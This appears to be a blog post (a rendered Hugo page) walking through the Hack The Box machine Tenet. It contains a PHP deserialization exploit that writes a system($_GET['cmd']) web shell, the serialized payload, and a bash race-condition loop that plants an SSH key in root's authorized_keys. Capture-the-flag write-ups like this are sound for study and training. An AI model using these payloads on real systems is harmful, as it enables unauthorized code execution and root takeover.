@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB - Tenet :: squ4r00t</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup for the &#39;Medium&#39; rated machine: Tenet" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/htb-tenet/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="//localhost:1313/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="//localhost:1313/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB - Tenet">
+<meta property="og:description" content="Writeup for the &#39;Medium&#39; rated machine: Tenet" />
+<meta property="og:url" content="//localhost:1313/posts/htb-tenet/" />
+<meta property="og:site_name" content="squ4r00t" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/img/htb/tenet/tn.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-04-27 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    &lt; squ4r00t &gt;
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/whoami">$ whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+      
+        
+          <li><a href="/whoami" >$ whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/htb-tenet/">HTB - Tenet</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-04-27</time><span class="post-author">squ4r00t</span>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+    </span>
+  
+  
+    
+    <img src="//localhost:1313/img/htb/tenet/tn.png"
+      class="post-cover"
+      alt=" "
+      title="Cover Image" />
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <blockquote>
+<p>Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it&rsquo;s backup. It is possible after identificaiton of the backup file to review its source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user <code>www-data</code> to user <code>Neil</code>. Further system enumeration reveals that this user have root permissions to run a bash script through <code>sudo</code>. The script is writing SSH public keys to the <code>authorized_keys</code> file of the <code>root</code> user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the <code>authorized_keys</code> file and use them to login to the system as <code>root</code>.</p></blockquote>
+<h2 id="port-scan-results">Port Scan Results<a href="#port-scan-results" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>From the results of the nmap scan, we see that we have 2 ports open: 22 and 80</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span></code></pre></div><h2 id="web-server">Web Server<a href="#web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<p>Navigating to <code>http://10.10.10.223</code>, we get the default Apache page</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/apache_default_page.png"   />
+    
+      <figcaption class="center" >Default Apache page</figcaption>
+    
+  </figure>
+
+
+<p>Seeing this, we can try to launch a directory fuzzing in order to discover other pages:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="581273964" type="checkbox"  />
+    <label for="581273964">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Dirfuzzing with ffuf</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+ffuf -u &#39;http://10.10.10.223/FUZZ&#39; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic
+
+&lt;SNIP...&gt;
+
+wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 26ms]
+</code></pre>
+  </div>
+
+
+<p>Short after, we discover a <code>/wordpress</code> endpoint. Navigating to <code>http://10.10.10.223/wordpress</code> we get the following:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/wordpress_without_css.png"   />
+    
+      <figcaption class="center" >Wordpress page</figcaption>
+    
+  </figure>
+
+
+<p>Looks like the css did not load properly. Upon examining the page source, we discover that the css file are fetched under the domain <code>tenet.htb</code>.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/page_source.png"   />
+    
+      <figcaption class="center" >Page source</figcaption>
+    
+  </figure>
+
+
+<p>After adding it to our hosts file and reloading the page, we are able to access the blog at <code>http://tenet.htb</code></p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/tenet_blog.png"   />
+    
+      <figcaption class="center" >Wordpress page with css</figcaption>
+    
+  </figure>
+
+
+<p>If we navigate at the bottom of the page, we can find something interesting:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/comment.png"   />
+    
+      <figcaption class="center" >Neil's comment on Migration post</figcaption>
+    
+  </figure>
+
+
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/migration_post.png"   />
+    
+      <figcaption class="center" >Migration post</figcaption>
+    
+  </figure>
+
+
+<p>In the above comment, neil is mentioning a <code>sator.php</code> file and a backup. However <code>/sator.php</code> does not exist on the <code>tenet.htb</code>, let&rsquo;s try the IP address instead.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/sator.php.png"   />
+    
+      <figcaption class="center" >/sator.php</figcaption>
+    
+  </figure>
+
+
+<p>We see something that looks like the output of a script. Assuming that the previously mentioned backup is of the <code>sator.php</code> file, we could try to get <code>/sator.php.bak</code>.</p>
+<h3 id="php-code-review">PHP Code Review<a href="#php-code-review" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>And it indeed works, we downloaded the php file, we can now read its content:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="798356241" type="checkbox"  />
+    <label for="798356241">
+      <span class="collapsable-code__language">php</span>
+      <span class="collapsable-code__title">sator.php</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-php" ><code>
+&lt;?php
+
+class DatabaseExport
+{
+        public $user_file = &#39;users.txt&#39;;
+        public $data = &#39;&#39;;
+
+        public function update_db()
+        {
+                echo &#39;[&#43;] Grabbing users from text file &lt;br&gt;&#39;;
+                $this-&gt; data = &#39;Success&#39;;
+        }
+
+
+        public function __destruct()
+        {
+                file_put_contents(__DIR__ . &#39;/&#39; . $this -&gt;user_file, $this-&gt;data);
+                echo &#39;[] Database updated &lt;br&gt;&#39;;
+        //      echo &#39;Gotta get this working properly...&#39;;
+        }
+}
+
+$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+
+
+?&gt;
+</code></pre>
+  </div>
+
+
+<p>This script will initialize the <code>$input</code> variable with the value of the GET parameter <code>arepo</code> (set to &lsquo;&rsquo;, if not provided). It will then unserialize it and save it in <code>$databaseupdate</code>.</p>
+<p>Looking at the <code>DatabaseExport</code> class, we see that it has two attributes:</p>
+<ul>
+<li><code>$user_file</code></li>
+<li><code>$data</code></li>
+</ul>
+<p>The function <code>update_db()</code> just outputs some text and update the <code>$data</code> variable to &lsquo;Success&rsquo;.</p>
+<p>The <code>__destruct()</code> function, which is a special function called when an object of type <code>DatabaseExport</code> is freed from the memory, will write to a file whatever is in the <code>$data</code> variable.</p>
+<p>With all this information, we can write a web shell by doing the following:</p>
+<ul>
+<li>Create a serialized object of type <code>DatabaseExport</code> with the <code>$user_file</code> variable set to the name of our webshell and <code>$data</code> set to the actual webshell php code.</li>
+<li>Pass this serialized object to the <code>sator.php</code> script through the GET parameter <code>arepo</code>.</li>
+<li>Then, the script will instanciate a new object with the provided data.</li>
+<li>Once the execution is done, the <code>__destruct()</code> method is called, and our webshell will be written.</li>
+</ul>
+<h3 id="deserialization-to-rce">Deserialization to RCE<a href="#deserialization-to-rce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>We can use the following php script to generate our serialized object:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="694812573" type="checkbox"  />
+    <label for="694812573">
+      <span class="collapsable-code__language">php</span>
+      <span class="collapsable-code__title">Exploit script</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-php" ><code>
+&lt;?php
+class DatabaseExport {
+    public $user_file = &#34;shell.php&#34;;
+    public $data = &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;;
+}
+
+$dbe = new DatabaseExport;
+echo &#34;-&gt; &#34; . serialize($dbe) . &#34;\n&#34;;
+?&gt;
+</code></pre>
+  </div>
+
+
+<p>After executing the script, we get the following serialized object:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;DatabaseExport&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">&#34;user_file&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">&#34;shell.php&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;data&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="s2">&#34;&lt;?php system(</span><span class="si">$_GET[&#34;cmd&#34;]</span><span class="s2">); ?&gt;&#34;</span><span class="p">;}</span>
+</span></span></code></pre></div><p>Now we can send it to the <code>sator.php</code> script:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/sending_payload.png"   />
+    
+      <figcaption class="center" >Sending exploit to /sator.php</figcaption>
+    
+  </figure>
+
+
+<p>Here we notice that <code>[] Database updated &lt;br&gt;</code> appears twice, indicating that the <code>__destruct()</code> method ran twice, which is a good sign.</p>
+<p>Now let&rsquo;s see if our web shell was successfully created:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/webshell.png"   />
+    
+      <figcaption class="center" >Web shell as www-data</figcaption>
+    
+  </figure>
+
+
+<p>It was, indeed!</p>
+<p>We can now get a reverse shell:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/revshell_payload.png"   />
+    
+      <figcaption class="center" >Executing reverse shell</figcaption>
+    
+  </figure>
+
+
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/revshell.png"   />
+    
+      <figcaption class="center" >Catching reverse shell on netcat listener</figcaption>
+    
+  </figure>
+
+
+<h2 id="privesc">Privesc<a href="#privesc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h3 id="www-data---neil">www-data -&gt; neil<a href="#www-data---neil" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>Under <code>/var/www/html/wordpress/wp-config.php</code>, we can find a database password for the user <code>neil</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/wp-config.png"   />
+    
+      <figcaption class="center" >Credentials in wp-config.php</figcaption>
+    
+  </figure>
+
+
+<p>Using it we can log in as <code>neil</code> and retrieve the user flag:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/user.txt.png"   />
+    
+      <figcaption class="center" >User flag obtained!</figcaption>
+    
+  </figure>
+
+
+<h3 id="neil---root">neil -&gt; root<a href="#neil---root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<hr>
+<p>The user <code>neil</code> can run the script <code>/usr/local/bin/enableSSH.sh</code> as root with no password.</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/neil_sudo_privs.png"   />
+    
+      <figcaption class="center" >Neil's sudo privileges</figcaption>
+    
+  </figure>
+
+
+<p>Let&rsquo;s examine the content of that script:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="928537614" type="checkbox"  />
+    <label for="928537614">
+      <span class="collapsable-code__language">php</span>
+      <span class="collapsable-code__title">enableSSH.sh</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-php" ><code>
+#!/bin/bash
+
+checkAdded() {
+
+        sshName=$(/bin/echo $key | /usr/bin/cut -d &#34; &#34; -f 3)
+
+        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+                /bin/echo &#34;Successfully added $sshName to authorized_keys file!&#34;
+
+        else
+
+                /bin/echo &#34;Error in adding $sshName to authorized_keys file!&#34;
+
+        fi
+
+}
+
+checkFile() {
+
+        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+                /bin/echo &#34;Error in creating key file!&#34;
+
+                if [[ -f $1 ]]; then /bin/rm $1; fi
+
+                exit 1
+
+        fi
+
+}
+
+addKey() {
+
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+        (umask 110; touch $tmpName)
+
+        /bin/echo $key &gt;&gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+}
+
+key=&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG&#43;AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN&#43;MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL&#43;c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt&#43;AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8&#43;4nT43N6N31lNhx4NeGabNx33b25lqermjA&#43;RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG&#43;kplLn2W&#43;pbzbgwTNN/w0p&#43;Urjbl root@ubuntu&#34;
+addKey
+checkAdded
+</code></pre>
+  </div>
+
+
+<p>This script will basically create a temporary file with <code>mktemp -u /tmp/ssh-XXXXXXXX</code>, then check if the file is empty and if it is an actual file. If the check passes, the content of the <code>$key</code> variable will be appended to it. And finally the temporary will appended to <code>/root/.ssh/authorized_keys</code>.</p>
+<p>The logic of this script opens the door for a potential race condition attack when the script is checking the newly created file (in the <code>checkFile()</code> function).</p>
+<p>To exploit it, we can create a script that will constantly update all temporary file by writting into them our ssh public key. We win the race if our update happens after the check, this will add our public key into <code>/root/.ssh/authorized_keys</code> effectively allowing us to login as root.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="387964512" type="checkbox"  />
+    <label for="387964512">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Updating script</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+while true; do
+    for tempfile in $(ls /tmp/ssh-*); do
+        echo &#34;&lt;KEY_HERE&gt;&#34; &gt; $tempfile;
+    done;
+done
+</code></pre>
+  </div>
+
+
+<p>We will have to run <code>/usr/local/bin/enableSSH.sh</code> multiple times until we win the race (the updating script should be running in the background):</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/race_won.png"   />
+    
+      <figcaption class="center" >Race Condition won</figcaption>
+    
+  </figure>
+
+
+<p>We can now login as root with the corresponding private key and retrieve the root flag:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/tenet/root.txt.png"   />
+    
+      <figcaption class="center" >Root flag obtained !</figcaption>
+    
+  </figure>
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="//localhost:1313/posts/htb-passage/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB - Passage</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/htb-instant/">
+                <span class="button__text">HTB - Instant</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
